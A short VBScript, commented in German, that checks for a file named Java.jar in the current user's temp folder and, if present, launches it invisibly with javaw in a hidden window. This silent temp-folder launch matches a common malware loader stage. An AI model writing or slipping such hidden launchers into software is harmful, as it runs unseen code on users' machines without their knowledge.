Set objShell = CreateObject("WScript.Shell")

' Erhalte den Pfad zum temporären Verzeichnis des aktuellen Benutzers
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")

' Setze den Pfad zur JAR-Datei
jarPath = tempFolder & "\Java.jar" ' Der Pfad zur Java.jar-Datei im temporären Verzeichnis

' Überprüfe, ob die JAR-Datei existiert und starte sie
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(jarPath) Then
    ' Starte die JAR-Datei mit javaw, um sie unsichtbar auszuführen
    objShell.Run "javaw -jar """ & jarPath & """", 0, False
End If
